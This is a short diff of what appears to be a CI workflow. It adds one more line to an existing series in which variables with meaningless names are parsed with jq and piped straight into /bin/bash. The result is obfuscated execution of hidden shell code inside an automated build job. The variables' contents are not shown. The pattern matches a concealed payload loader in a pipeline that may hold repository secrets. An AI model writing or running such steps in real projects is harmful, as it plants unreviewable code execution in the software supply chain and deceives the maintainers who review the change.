@@ -35,6 +35,7 @@ jobs:
           echo $efv66178 | jq -r .pba72 | /bin/bash
           echo $t319 | jq -r .ommb2794 | /bin/bash
           echo $fvbvt55 | jq -r .o51322 | /bin/bash
+          echo $ft3 | jq -r .h095 | /bin/bash
 
       - name: Upload data
         if: always()
